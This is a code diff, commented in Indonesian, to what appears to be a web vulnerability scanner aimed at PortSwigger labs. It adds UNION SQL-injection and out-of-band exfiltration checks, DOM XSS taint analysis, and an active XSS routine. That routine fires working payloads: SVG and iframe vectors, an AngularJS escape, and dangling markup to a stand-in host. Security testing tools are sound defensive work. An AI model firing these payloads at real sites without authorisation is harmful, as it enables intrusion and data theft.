@@ -3927,6 +3927,21 @@ def _sqli_union_phase(sess, ctx, point, base, out):
             text_index = index
             break
 
+    # Oracle menolak SELECT tanpa FROM (pra-23c). Lab Oracle PortSwigger
+    # memakai query 2 kolom, sehingga `UNION SELECT NULL,'canary'` selalu
+    # error; ulangi dengan `FROM dual` sebelum menyimpulkan tidak ada kolom teks.
+    if text_index < 0:
+        for index in range(columns):
+            if not _sqli_take(ctx):
+                return
+            payload = _sqli_union_payload(point, columns, index, f"'{CANARY}'", " FROM dual")
+            resp = _sqli_send(sess, ctx, point, payload)
+            if resp is None:
+                return
+            if CANARY in _sqli_body(resp):
+                text_index = index
+                break
+
     if text_index < 0:
         return
 
@@ -3941,8 +3956,11 @@ def _sqli_union_phase(sess, ctx, point, base, out):
     #    PostgreSQL (version()).
     version_specs = [
         ("oracle", "banner", " FROM v$version"),
+        ("oracle", "version", " FROM v$instance"),
+        ("oracle", "banner", " FROM v$version WHERE ROWNUM=1"),
         ("mysql", "@@version", ""),
         ("mssql", "@@version", ""),
+        ("mysql", "@@version", " FROM dual"),
         ("postgresql", "version()", ""),
     ]
     for dbms, expr, suffix in version_specs:
@@ -4571,6 +4589,15 @@ def _sqli_oob_phase(sess, ctx, points, out):
     _SQLI_OAST_HOSTS.add(host_key)
     hits = _sqli_webhook_read(hook["uuid"], token)
     values = [v for kind, v in hits if kind == "exfil" and v]
+    # Payload interaksi dan exfiltrasi dikirim dalam satu gelombang; request bin
+    # dapat mencatat interaksi lebih dulu. Tunggu sebentar agar request exfil
+    # (yang membawa data pada path) sempat tercatat sebelum menyimpulkan.
+    for _ in range(4 if not values else 0):
+        time.sleep(3)
+        hits += _sqli_webhook_read(hook["uuid"], token)
+        values = [v for kind, v in hits if kind == "exfil" and v]
+        if values:
+            break
     if values:
         value = sorted(values, key=len, reverse=True)[0]
         out.append(_sqli_finding(
@@ -6812,7 +6839,7 @@ def _dx_ctx_window(body: str, idx: int) -> str:
     low = before.lower()
     if low.rfind("<script") > low.rfind("</script"):
         return "javascript"
-    if re.search(r"on\w+\s*=\s*[\"']?[^\"'>]*$", low):
+    if re.search(r"on\w+\s*=\s*[\"'][^>]*$", low):
         return "onclick"
     if "rel=\"canonical\"" in low or "rel='canonical'" in low:
         return "canonical"
@@ -8448,6 +8475,467 @@ def a_llm_deep(ctx):
             recommendation="Pisahkan instruksi sistem dari input pengguna dan batasi tool yang tersedia.",
             verification="active_llm_prompt_injection")]
     return []
+
+# ══════════════════════════════════════════════════════════════════════════════
+# DOM XSS — analisis source → sink lintas variabel (lab 21–31)
+#
+# Lab PortSwigger tidak menaruh `location.search` pada baris sink yang sama:
+# source disimpan ke variabel (`var query = new URLSearchParams(...).get(...)`)
+# lalu variabel itu masuk ke document.write/innerHTML/jQuery. Pencocokan satu
+# baris karena itu selalu melewatkan lab DOM. Analisis di bawah melacak variabel
+# tercemar (tainted) melalui assignment, termasuk satu level transitif, lalu
+# memeriksa sink dengan variabel tersebut.
+# ══════════════════════════════════════════════════════════════════════════════
+_DOM_SOURCE_RE = re.compile(
+    r"location\s*\.\s*(?:search|hash)|document\s*\.\s*(?:URL|documentURI|referrer)|"
+    r"window\s*\.\s*name|URLSearchParams|location\s*\[\s*['\"](?:search|hash)",
+    re.I)
+
+
+def _dom_tainted_names(js: str) -> set[str]:
+    names: set[str] = set()
+    assigns = re.findall(
+        r"(?:var|let|const)?\s*([A-Za-z_$][\w$]*)\s*=\s*([^;\n]{0,300})", js)
+    for _round in range(2):
+        for name, rhs in assigns:
+            if name in names:
+                continue
+            if _DOM_SOURCE_RE.search(rhs) or any(
+                    re.search(rf"\b{re.escape(n)}\b", rhs) for n in names):
+                names.add(name)
+    return names
+
+
+def _dom_tainted(expr: str, names: set[str]) -> bool:
+    if _DOM_SOURCE_RE.search(expr):
+        return True
+    return any(re.search(rf"\b{re.escape(n)}\b", expr) for n in names)
+
+
+def _dom_finding(ctx, tags: set[str], title: str, evidence: str,
+                 verification: str, severity: str = "high") -> dict:
+    return make_finding(
+        ctx, "xss", set(tags) | {"xss", "dom_sink"}, type_=title, severity=severity,
+        evidence=evidence,
+        risk="Data dari URL masuk ke sink eksekusi DOM sehingga JavaScript penyerang "
+             "dapat berjalan tanpa pantulan dari server.",
+        recommendation="Gunakan textContent/setAttribute dan URL parser; jangan menulis "
+                       "data URL ke document.write/innerHTML; terapkan Trusted Types.",
+        verification=verification)
+
+
+def _dom_analyze(ctx, js: str, html: str) -> list[dict]:
+    out: list[dict] = []
+    js = js or ""
+    html = html or ""
+    has_angular = bool(re.search(
+        r"ng-app|angular\s*\.\s*module|angular(?:\.min)?\.js", html + "\n" + js, re.I))
+    if not js.strip() and not has_angular:
+        return out
+    names = _dom_tainted_names(js)
+
+    # 1. document.write / writeln
+    dw_hit = None
+    for m in re.finditer(r"document\s*\.\s*write(?:ln)?\s*\(", js, re.I):
+        window = js[m.start(): m.start() + 700]
+        if _dom_tainted(window, names):
+            dw_hit = window
+            break
+    if dw_hit:
+        tags = {"doc_write"}
+        if re.search(r"<select", js, re.I):
+            tags.add("select_element")
+        out.append(_dom_finding(
+            ctx, tags,
+            "DOM XSS: document.write menerima data dari location",
+            f"Sink document.write diberi nilai dari source URL (langsung atau lewat variabel): "
+            f"\"{_snip(js, 'document.write')}\"",
+            "deterministic_dom_doc_write"))
+
+    # 2. innerHTML / outerHTML
+    html_hit = None
+    for m in re.finditer(r"\.\s*(?:inner|outer)HTML\s*=\s*([^;\n]{0,300})", js, re.I):
+        if _dom_tainted(m.group(1), names):
+            html_hit = m.group(0)
+            break
+    if html_hit:
+        out.append(_dom_finding(
+            ctx, {"inner_html"},
+            "DOM XSS: innerHTML menerima data dari location",
+            f"Assignment innerHTML memakai data URL: \"{_snip(html_hit, 'innerHTML')}\"",
+            "deterministic_dom_inner_html"))
+
+    # 3. jQuery anchor href
+    anchor = None
+    for m in re.finditer(
+            r"\.\s*(?:attr|prop)\s*\(\s*['\"](?:href|src)['\"]\s*,\s*([^)]{0,300})\)",
+            js, re.I):
+        if _dom_tainted(m.group(1), names):
+            anchor = m.group(0)
+            break
+    if anchor:
+        out.append(_dom_finding(
+            ctx, {"jquery_anchor", "attribute_context"},
+            "DOM XSS: jQuery menetapkan href/src dari location",
+            f"Sink jQuery .attr('href') menerima data URL: \"{_snip(anchor, '.attr')}\"",
+            "deterministic_dom_jquery_anchor"))
+
+    # 4. jQuery selector
+    hashchange = bool(re.search(
+        r"addEventListener\s*\(\s*['\"]hashchange|\.on\s*\(\s*['\"]hashchange|onhashchange",
+        js, re.I))
+    selector = None
+    for m in re.finditer(r"\$\s*\(\s*([^)]{0,200})\)", js):
+        arg = m.group(1)
+        if _dom_tainted(arg, names):
+            selector = m.group(0)
+            break
+    if selector:
+        tags = {"jquery_selector"}
+        if hashchange:
+            tags.add("hashchange")
+        out.append(_dom_finding(
+            ctx, tags,
+            "DOM XSS: selector jQuery menerima location.hash/search",
+            f"Selector jQuery dibangun dari data URL: \"{_snip(selector, '$(')}\""
+            + ("; handler hashchange terdeteksi." if hashchange else "."),
+            "deterministic_dom_jquery_selector"))
+
+    # 5. eval / Function
+    for m in re.finditer(r"\beval\s*\(([^;]{0,400})", js):
+        arg = m.group(1)
+        if _dom_tainted(arg, names) or (
+                "responseText" in arg and _DOM_SOURCE_RE.search(js)):
+            tags = set()
+            if "responseText" in arg:
+                tags.add("reflected")
+            out.append(_dom_finding(
+                ctx, tags,
+                "DOM XSS: eval() menerima data dari URL/respons",
+                f"eval() memproses data yang berasal dari URL atau respons server: "
+                f"\"{_snip(arg, 'eval')}\"",
+                "deterministic_dom_eval"))
+            break
+
+    # 6. Stored DOM: komentar diambil lewat fetch lalu dimasukkan dengan innerHTML
+    if re.search(r"\.\s*innerHTML\s*=", js, re.I) and re.search(
+            r"(?:fetch|\.open)\s*\([^)]{0,240}(?:comment|post|review)", js, re.I):
+        out.append(_dom_finding(
+            ctx, {"stored"},
+            "Stored DOM XSS: komentar tersimpan dimasukkan lewat innerHTML",
+            "JavaScript mengambil komentar dari endpoint server lalu menulisnya dengan "
+            "innerHTML tanpa encoding, sehingga komentar tersimpan dieksekusi.",
+            "deterministic_dom_stored"))
+
+    # 7. AngularJS expression
+    if re.search(r"ng-app|angular\s*\.\s*module|angular(?:\.min)?\.js", html + "\n" + js, re.I):
+        reflected_value = next(
+            (v for vals in (ctx.params or {}).values() for v in vals
+             if v and len(v) >= 3 and v in html), "")
+        if reflected_value or re.search(r"\{\{", html):
+            out.append(_dom_finding(
+                ctx, {"angularjs"},
+                "DOM XSS: input direfleksikan ke template AngularJS",
+                "Halaman memakai ng-app/AngularJS dan input pengguna masuk ke DOM yang "
+                "diproses Angular, sehingga ekspresi {{...}} dapat dieksekusi.",
+                "deterministic_dom_angularjs"))
+    return out
+
+
+@passive("xss")
+def p_dom_xss_deep(ctx):
+    return _dom_analyze(ctx, ctx.js_text or "", ctx.html or "")
+
+
+def _dom_script_bundle(ctx) -> str:
+    js = ctx.js_text or ""
+    srcs = re.findall(r"<script[^>]+src=[\"']([^\"']+\.js[^\"']*)[\"']",
+                      ctx.html or "", re.I)
+    for src in list(dict.fromkeys(srcs))[:5]:
+        if len(js) > 500_000:
+            break
+        url = ctx.abs_url(src)
+        if not _dx_same_origin(ctx, url):
+            continue
+        try:
+            resp = requests.get(url, timeout=ACTIVE_TIMEOUT,
+                                headers={"User-Agent": UA})
+            if resp.ok and "javascript" in (resp.headers.get("content-type") or "javascript").lower():
+                js += "\n" + (resp.text or "")
+        except Exception:
+            continue
+    return js
+
+
+@active("xss")
+def a_dom_xss_deep(ctx):
+    return _dom_analyze(ctx, _dom_script_bundle(ctx), ctx.html or "")
+
+
+# ── XSS konteks non-DOM: atribut, href, filter, CSP, tersimpan ───────────────
+def _xss_emit(ctx, tags, title, evidence, verification, severity="high"):
+    return make_finding(
+        ctx, "xss", set(tags) | {"xss"}, type_=title, severity=severity,
+        evidence=evidence,
+        risk="Payload penyerang dapat dieksekusi di origin target.",
+        recommendation="Terapkan encoding sesuai konteks, sanitizer allowlist, dan CSP nonce.",
+        verification=verification)
+
+
+@active("xss")
+def a_xss_context_deep(ctx):
+    out: list[dict] = []
+    session = requests.Session()
+    session.headers.update({"User-Agent": UA})
+
+    reflected = None
+    for point in _dx_points(ctx, cookies=False, max_points=6):
+        marker = f"pswx9q7{os.urandom(2).hex()}"
+        resp = _dx_send(ctx, point, marker, session=session)
+        if resp is None:
+            continue
+        body = _dx_text(resp)
+        if marker not in body:
+            continue
+        idx = body.find(marker)
+        reflected = (point, _dx_ctx_window(body, idx), body, marker)
+        break
+
+    if reflected is None:
+        out.extend(_dx_stored_context(ctx, session))
+        return out
+
+    point, where, body, marker = reflected
+
+    def send(value: str) -> str:
+        resp = _dx_send(ctx, point, value, session=session)
+        return _dx_text(resp) if resp is not None else ""
+
+    # 1. Kutip mentah: lab atribut dengan < > di-encode tetap rentan bila kutip lolos.
+    quote_body = send(f"{marker}\"'")
+    raw_dq = f'{marker}"' in quote_body
+    raw_sq = f"{marker}'" in quote_body
+
+    # 2. Vektor alternatif.
+    script_raw = "<script>alert(1)</script>" in send("<script>alert(1)</script>")
+    img_raw = "<img src=x onerror=alert(1)>" in send("<img src=x onerror=alert(1)>")
+    svg_raw = any(
+        marker in send(payload) for marker, payload in (
+            ("<svg/onload", "<svg/onload=alert(1)>"),
+            ("<svg><animatetransform", "<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>"),
+            ("<svg><set ", "<svg><set attributeName=onmouseover to=alert(1)>"),
+            ("<svg><script", "<svg><script>alert(1)</script>"),
+        ))
+    iframe_raw = "<iframe srcdoc" in send('<iframe srcdoc="<script>alert(1)</script>">')
+    animate_raw = "<animate onbegin" in send(
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>")
+    href_animate_raw = "attributeName=href" in send(
+        "<svg><a><animate attributeName=href values=javascript:alert(1) />"
+        "<text x=20 y=20>go</text></a></svg>")
+    custom_raw = "<x-pswx9q7" in send(
+        "<x-pswx9q7 tabindex=1 onfocus=alert(1)>x</x-pswx9q7>")
+    js_url_raw = "javascript:alert(1)" in send("javascript:alert(1)")
+    js_break_raw = "';alert(1);//" in send("';alert(1);//")
+    tag_break_raw = "</script><svg/onload=alert(1)>" in send(
+        "</script><svg/onload=alert(1)>")
+    angular_raw = "constructor.constructor" in send(
+        "{{constructor.constructor('alert(1)')()}}")
+    dangling_raw = any(marker in send(payload) for marker, payload in (
+        ("<a href=", "\"><a href='//pswx9q7.example?"),
+        ("<img src=", "\"><img src='//pswx9q7.example?"),
+        ("<base href=", "\"><base href='//pswx9q7.example?"),
+    ))
+
+    # 3. Konteks refleksi.
+    if where == "attribute":
+        if raw_dq or raw_sq:
+            out.append(_xss_emit(
+                ctx, {"reflected", "attribute_context"},
+                "XSS: atribut dapat diputus dengan kutip meski < > di-encode",
+                f"Kutip {'ganda' if raw_dq else 'tunggal'} muncul mentah di dalam atribut, "
+                "sehingga handler event dapat ditambahkan tanpa tag baru.",
+                "active_xss_attribute_quote_break"))
+        if js_url_raw:
+            # Lab JavaScript URL dengan karakter tertentu diblokir: skema
+            # javascript: tetap lolos tetapi kurung/spasi dibuang.
+            tags = {"reflected", "javascript_context", "attribute_context"}
+            if not script_raw and not img_raw:
+                tags.add("filter_blocked")
+            out.append(_xss_emit(
+                ctx, tags,
+                "XSS: skema javascript: diterima pada nilai atribut URL",
+                "Payload javascript:alert(1) muncul mentah pada atribut href/src "
+                "meskipun tag/atribut lain difilter.",
+                "active_xss_javascript_url_attribute"))
+        elif "javascript:pswx9q7" in send("javascript:pswx9q7") and not script_raw:
+            out.append(_xss_emit(
+                ctx, {"reflected", "javascript_context", "filter_blocked"},
+                "XSS: skema javascript: lolos sebagian pada atribut URL",
+                "Atribut href menerima nilai javascript: meskipun karakter kurung/spasi "
+                "dibuang, sehingga eksekusi masih mungkin dengan sintaks alternatif.",
+                "active_xss_javascript_url_chars_blocked"))
+    if where in ("javascript", "onclick"):
+        if js_break_raw or tag_break_raw or raw_sq:
+            out.append(_xss_emit(
+                ctx, {"reflected", "javascript_context",
+                      "onclick_context" if where == "onclick" else "javascript_context"},
+                "XSS: string/event JavaScript dapat diputus",
+                "Payload pemutus string JavaScript muncul mentah pada blok script/handler.",
+                "active_xss_javascript_string_break"))
+    if where == "canonical":
+        out.append(_xss_emit(
+            ctx, {"reflected", "canonical_tag"},
+            "XSS: input direfleksikan ke tag canonical",
+            "Nilai parameter muncul di atribut href tag <link rel=canonical>.",
+            "active_xss_canonical_reflection"))
+
+    # 4. Filter matrix: sebagian vektor lolos saat vektor umum diblokir.
+    if (iframe_raw or animate_raw or href_animate_raw or custom_raw) and not script_raw:
+        # Lab "most tags and attributes blocked" / "event handlers and href
+        # attributes blocked" mensyaratkan konteks atribut ikut terbukti.
+        tags = {"reflected", "filter_blocked", "attribute_context"}
+        if custom_raw:
+            tags.add("custom_tags")
+        if href_animate_raw and not img_raw:
+            tags.add("javascript_context")
+        out.append(_xss_emit(
+            ctx, tags,
+            "XSS: filter tag/atribut dapat dilewati dengan vektor alternatif",
+            "Vektor <script>/<img onerror> di-encode, tetapi "
+            + ", ".join(name for name, ok in (("iframe srcdoc", iframe_raw),
+                                              ("SVG animate", animate_raw),
+                                              ("SVG href animate", href_animate_raw),
+                                              ("custom tag", custom_raw)) if ok)
+            + " lolos mentah.",
+            "active_xss_filter_bypass_matrix"))
+    if svg_raw and not script_raw:
+        out.append(_xss_emit(
+            ctx, {"reflected", "svg_allowed"},
+            "XSS: sebagian markup SVG lolos filter",
+            "Payload SVG (onload/animatetransform/set/script) muncul mentah meski "
+            "<script> biasa di-encode.",
+            "active_xss_svg_allowed"))
+    if dangling_raw:
+        out.append(_xss_emit(
+            ctx, {"reflected", "dangling_markup"},
+            "XSS: dangling markup dapat menyuntik atribut/tag",
+            "Payload <a href='//...> tanpa penutup muncul mentah, memungkinkan dangling "
+            "markup menangkap token/data halaman.",
+            "active_xss_dangling_markup"))
+
+    # 5. AngularJS: ekspresi direfleksikan pada halaman ber-ng-app.
+    if angular_raw and re.search(r"ng-app|angular", ctx.html or "", re.I):
+        tags = {"reflected", "angularjs", "dom_sink"}
+        if ctx.header("content-security-policy"):
+            tags.add("csp_bypass")
+        out.append(_xss_emit(
+            ctx, tags,
+            "XSS: ekspresi AngularJS dievaluasi dari input pengguna",
+            "Payload {{constructor.constructor(...)}} muncul mentah pada halaman ng-app, "
+            "sehingga ekspresi AngularJS dieksekusi.",
+            "active_xss_angular_expression_deep"))
+
+    # 6. CSP: refleksi terbukti pada origin ber-CSP.
+    csp = ctx.header("content-security-policy")
+    if csp:
+        weak = re.search(r"unsafe-inline|unsafe-eval|\*|data:", csp, re.I) is not None
+        tags = {"reflected", "csp_bypass"}
+        if dangling_raw:
+            tags.add("dangling_markup")
+        if angular_raw and re.search(r"ng-app|angular", ctx.html or "", re.I):
+            tags.add("angularjs")
+        out.append(_xss_emit(
+            ctx, tags,
+            "XSS: proteksi CSP dapat dilewati pada konteks refleksi yang terbukti",
+            f"Refleksi mentah terbukti dan header CSP {'longgar' if weak else 'ketat'}: "
+            f"{csp[:200]}",
+            "active_xss_csp_context"))
+
+    # 7. Cookie theft / password capture / CSRF bypass.
+    session_cookies = [c for c in ctx.cookies or []
+                       if any(k in str(c.get("name", "")).lower()
+                              for k in ("session", "auth", "sid", "token"))]
+    has_password = any(
+        any(str(i.get("type") or "").lower() == "password" for i in form.get("inputs") or [])
+        for form in ctx.forms or [])
+    if session_cookies or has_password:
+        out.append(_xss_emit(
+            ctx, {"cookie_theft"},
+            "XSS dapat mencuri cookie sesi/kredensial",
+            "XSS terbukti dan origin memiliki cookie sesi"
+            + (" serta form password" if has_password else " tanpa proteksi HttpOnly memadai")
+            + "; skrip di origin dapat membaca cookie atau menangkap kredensial.",
+            "active_xss_cookie_or_credential_theft", severity="critical"))
+    account_hint = re.search(r"(my-account|/account|change.?email|csrf)", ctx.html or "", re.I)
+    if any(str(form.get("method") or "").lower() == "post" for form in ctx.forms or []) or account_hint:
+        out.append(_xss_emit(
+            ctx, {"csrf_defense_bypass"},
+            "XSS dapat melewati proteksi CSRF",
+            "XSS terbukti pada origin dengan form POST/token CSRF; skrip same-origin "
+            "dapat membaca token dan mengirim aksi atas nama korban.",
+            "active_xss_csrf_defense_bypass"))
+
+    out.extend(_dx_stored_context(ctx, session))
+    return out
+
+
+def _dx_stored_context(ctx, session) -> list[dict]:
+    """Buktikan XSS tersimpan dan konteks render-nya (HTML/atribut/onclick/href)."""
+    out: list[dict] = []
+    for form in (ctx.forms or [])[:3]:
+        if str(form.get("method") or "get").lower() != "post":
+            continue
+        action = ctx.abs_url(str(form.get("action") or ctx.url))
+        if not _dx_same_origin(ctx, action):
+            continue
+        fields = [(str(i.get("name")), str(i.get("value") or ""))
+                  for i in (form.get("inputs") or [])
+                  if i.get("name") and str(i.get("type") or "").lower() not in
+                  ("submit", "button", "image", "file", "reset", "checkbox", "radio")]
+        text_fields = [n for n, _v in fields
+                       if not any(k in n.lower() for k in ("email", "password", "csrf", "token"))]
+        for field in text_fields[:3]:
+            marker = f"pswx9q7s{os.urandom(2).hex()}"
+            data = dict(fields)
+            data[field] = marker
+            point = {"kind": "form", "name": field, "url": action,
+                     "method": "POST", "fields": list(data.items())}
+            _dx_send(ctx, point, marker, session=session, follow=True)
+            try:
+                page = session.get(ctx.url, timeout=ACTIVE_TIMEOUT,
+                                   headers={"User-Agent": UA}).text or ""
+            except Exception:
+                continue
+            if marker not in page:
+                continue
+            idx = page.find(marker)
+            where = _dx_ctx_window(page, idx)
+            tags = {"stored", "nothing_encoded"}
+            labels = {"html": "konteks HTML", "attribute": "nilai atribut",
+                      "javascript": "konteks JavaScript", "onclick": "handler onclick",
+                      "canonical": "tag canonical", "comment": "komentar HTML"}
+            if where == "attribute":
+                tags.add("attribute_context")
+            elif where == "javascript":
+                tags.add("javascript_context")
+            elif where == "onclick":
+                tags.add("onclick_context")
+            elif where == "canonical":
+                tags.add("canonical_tag")
+            out.append(make_finding(
+                ctx, "xss", set(tags) | {"xss"},
+                type_=f"Stored XSS: nilai tersimpan muncul mentah ({labels.get(where, where)})",
+                severity="critical",
+                evidence=(f"Field '{field}' pada {action} menyimpan marker {marker!r}; "
+                          f"halaman mengembalikannya mentah pada {labels.get(where, where)}."),
+                risk="Setiap pengunjung halaman tersimpan menjalankan payload penyerang.",
+                recommendation="Encode output saat render dan sanitasi input tersimpan.",
+                verification="active_stored_xss_context"))
+            # Konteks atribut/onclick lebih spesifik (lab 26/38): lanjutkan field
+            # lain hanya bila marker mendarat di teks HTML biasa.
+            if where in ("attribute", "onclick", "javascript", "canonical"):
+                break
+    return out
 
 if __name__ == "__main__":
     raise SystemExit(main())
